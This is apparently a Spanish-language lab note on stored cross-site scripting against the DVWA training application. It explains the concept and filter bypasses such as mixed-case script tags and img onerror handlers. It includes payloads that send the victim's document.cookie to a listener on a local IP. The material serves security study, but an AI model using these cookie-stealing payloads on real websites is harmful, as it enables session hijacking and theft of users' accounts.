
Vulnerabilidad persistente donde el payload malicioso es almacenado permanentemente en el servidor (base de datos, sistema de archivos, memoria caché) y posteriormente servido a múltiples usuarios en el contenido legítimo de la aplicación. Constituye la variante de mayor severidad debido a su escala de impacto.
**Analogía Estructurada**:  
_Contaminación de Lote en Cadena de Suministro_: Un producto manufacturado es adulterado durante el proceso de producción. La contaminación se distribuye sistemáticamente a través de la cadena de suministro, afectando a todos los consumidores que adquieran el producto hasta que el lote completo sea identificado y retirado del mercado.



```
<script>window.location='http://127.0.0.1:1337//?cookie="+document.cookie</script>
```

![Pasted ima7](../images/Pasted%20image%2020251204022932.png)        

Una vez que hagas clic en "Sign Guestbook":

1. **Redirección Inmediata:** Tu navegador debería ser expulsado de DVWA y enviado a tu servidor Python inmediatamente.
    
2. **La Trampa Persistente:** Aquí viene la parte peligrosa del XSS Almacenado:
    
    - Vuelve a entrar a DVWA y loguéate de nuevo.
        
    - Intenta entrar al menú **XSS (Stored)**.
        
    - **¿Qué pasa?** Apenas entres, ¡serás redirigido otra vez!
A nivel medio

### 1. Capitalización Mixta 

Como el filtro de PHP (`str_replace`) suele distinguir entre mayúsculas y minúsculas, pero el navegador (HTML) no, puedes mezclar las letras para que el filtro no reconozca la palabra prohibida.

- **Payload:** `<ScRiPt> ... </sCrlpT>`.
- **Por qué funciona:** El filtro busca "script" (todo minúsculas). Al no encontrarlo exacto, lo deja pasar. El navegador luego lo lee y dice "Ah, esto es un script" y lo ejecuta.
### 2. "Qué cosas más": Uso de Otros Elementos (Eventos HTML)

Esta es la alternativa más robusta sugerida en el informe. Si el filtro está obsesionado con la etiqueta `<script>`, la solución es **no usar esa etiqueta**.

Puedes ejecutar JavaScript dentro de otros elementos HTML estándar usando **eventos**. El ejemplo clásico es la etiqueta de imagen `<img>`.

- **Payload Básico:** `<img src=x onerror=alert(1)>`.
    

**¿Cómo funciona esto?**

1. **`src=x`**: El navegador intenta cargar una imagen llamada "x".
    
2. **Fallo:** Como esa imagen no existe, se produce un error de carga.
    
3. **`onerror=...`**: Al fallar, el navegador ejecuta automáticamente el código JavaScript que pusiste en el atributo `onerror`.
    

---

```
<img src=x onerror="window.location='http://192.168.122.1:1337/?cookie='+document.cookie">
```
![Pasted ima](../images/Pasted%20image%2020251204023416.png)


**Resultado:** El filtro del servidor buscará la palabra `<script>`. Como no la encontrará (porque estás usando `<img>`), dejará pasar el mensaje. Cuando el navegador intente mostrar el comentario, la imagen fallará y te redirigirá a tu servidor con la cookie.
